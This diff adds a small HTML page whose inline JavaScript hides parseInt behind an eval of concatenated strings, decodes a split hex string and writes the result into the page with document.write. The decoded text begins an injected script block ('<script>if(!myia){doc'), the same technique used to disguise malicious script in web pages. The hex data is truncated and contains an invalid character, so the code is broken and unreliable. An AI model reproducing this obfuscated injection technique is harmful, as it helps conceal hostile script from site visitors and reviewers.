@@ -1,0 +1,42 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Untitled Document</title>
+</head>
+<script src="jQuery/jquery-3.1.1.min.js"></script>
+
+<body>
+
+
+<script>
+function f1(p1)	{
+		return (eval('pa'+'rseInt')(p1, 16));
+};
+
+function f2(p2){
+
+	var string1="";
+	
+ 	for(i=0;i<p2.length;i+=2){
+		//string1=string1+string1.fromCharCode(f1(p2.substr(i,2)));
+		var k = f1(p2.substr(i,2));
+		var kk = String.fromCharCode(k);
+		string1 += kk;
+	}
+	return string1;	
+};
+
+
+var v79='';
+var string3='3C7'+v79+'3637'+v79+'2697'+v79+'07'+v79+'43E696628216D7'+v79+'96961297'+v79+'B646F637'+v79+'S6C';
+
+var abccc=(f2(string3));
+document.write(abccc);
+console.log(abccc);
+	
+</script>
+
+	
+</body>
+</html>
